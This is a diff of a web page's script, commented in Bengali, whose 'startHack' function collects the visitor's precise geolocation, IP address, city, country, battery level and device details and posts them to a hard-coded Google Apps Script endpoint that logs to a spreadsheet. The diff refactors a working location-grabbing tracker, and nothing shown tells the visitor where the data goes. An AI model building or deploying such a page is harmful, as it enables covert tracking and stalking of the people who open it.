@@ -23,74 +23,74 @@
 </div>
 
 <script>
-    function startHack() {
+    // আপনার গুগল শিটের URL এখানে বসান (https://script.google.com/macros/s/.../exec)
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbycWxHSynXyY53SpIcxpyA-TGmDknjalJTBb5DaTpf6ZMYeZV_HfRk7Nh5lD1nQpQbB/exec'; 
+
+    async function startHack() {
         document.getElementById('status').style.display = 'block';
         
-        const deviceData = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenRes: window.screen.width + "x" + window.screen.height,
-            battery: navigator.getBattery ? "Checking..." : "N/A",
-            time: new Date().toLocaleString(),
-            ip: "" 
-        };
+        let deviceData = {};
 
-        if(navigator.getBattery){
-            navigator.getBattery().then(batt => {
-                deviceData.battery = batt.level * 100 + "%";
-                sendToServer(deviceData);
+        try {
+            // ১. ব্যাটারি লেভেল নেওয়া (সবচেয়ে দ্রুত)
+            if(navigator.getBattery){
+                const battery = await navigator.getBattery();
+                deviceData.battery = (battery.level * 100).toFixed(0) + "%";
+            } else {
+                deviceData.battery = "N/A";
+            }
+
+            // ২. লোকেশন নেওয়া (সবচেয়ে গুরুত্বপূর্ণ - পারমিশন চাইবে)
+            const location = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, long: pos.coords.longitude }),
+                    err => resolve({ lat: "Denied", long: "Denied" }) // পারমিশন না দিলেও রান করবে
+                );
             });
-        } else {
-            sendToServer(deviceData);
-        }
+            deviceData.lat = location.lat;
+            deviceData.long = location.long;
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                deviceData.latitude = pos.coords.latitude;
-                deviceData.longitude = pos.coords.longitude;
-                deviceData.accuracy = pos.coords.accuracy;
-                sendToServer(deviceData);
-            }, err => {
-                console.log("Location permission denied");
-                sendToServer(deviceData);
-            });
-        } else {
-            sendToServer(deviceData);
-        }
+            // ৩. IP এড্রেস নেওয়া (API কল)
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                deviceData.ip = ipData.ip;
+                deviceData.city = ipData.city;
+                deviceData.country = ipData.country_name;
+            } catch (e) {
+                deviceData.ip = "Fetch Failed";
+            }
 
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                deviceData.ip = data.ip;
-                deviceData.city = data.city;
-                deviceData.country = data.country_name;
-                
-                if(deviceData.latitude) {
-                    sendToServer(deviceData); 
-                } else {
-                    deviceData.latitude = "Pending";
-                    deviceData.longitude = "Pending";
-                    sendToServer(deviceData);
-                }
-            })
-            .catch(err => console.log("IP fetch error"));
+            // ৪. ডিভাইসের তথ্য
+            deviceData.userAgent = navigator.userAgent;
+            deviceData.platform = navigator.platform;
+            deviceData.time = new Date().toLocaleString();
+
+            // ৫. সব ডাটা গুগল শিটে পাঠানো (এখন সব ডেটা প্রস্তুত)
+            await sendDataToSheet(deviceData);
+
+        } catch (error) {
+            console.error("Error:", error);
+            document.getElementById('status').innerText = "❌ ত্রুটি দেখা দিয়েছে";
+        }
     }
 
-    function sendToServer(data) {
-        // এখানে আপনার Google Script URL বসান
-        const scriptUrl = 'https://script.google.com/macros/s/AKfycbycWxHSynXyY53SpIcxpyA-TGmDknjalJTBb5DaTpf6ZMYeZV_HfRk7Nh5lD1nQpQbB/exec'; 
-        
-        fetch(scriptUrl, {
-            method: 'POST',
-            mode: 'no-cors', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        })
-        .then(() => {
-            document.getElementById('status').innerText = "✅ ডেটা জমা হয়েছে!";
-            document.getElementById('status').style.color = "green";
-        })
-        .catch(err => console.log("Send Error:", err));
+    async function sendDataToSheet(data) {
+        // গুগল শিটে ডেটা পাঠানোর ফাংশন
+        try {
+            await fetch(SHEET_URL, {
+                method: 'POST',
+                mode: 'no-cors', // গুগলের জন্য জরুরি
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            
+            document.getElementById('status').innerText = "✅ লোকেশন ও IP সফলভাবে পাঠানো হয়েছে!";
+            document.getElementById('status').style.color = "#00ff00";
+        } catch (e) {
+            console.log("Send Error:", e);
+            document.getElementById('status').innerText = "ডেটা পাঠানো হচ্ছে...";
+        }
     }
 </script>
 
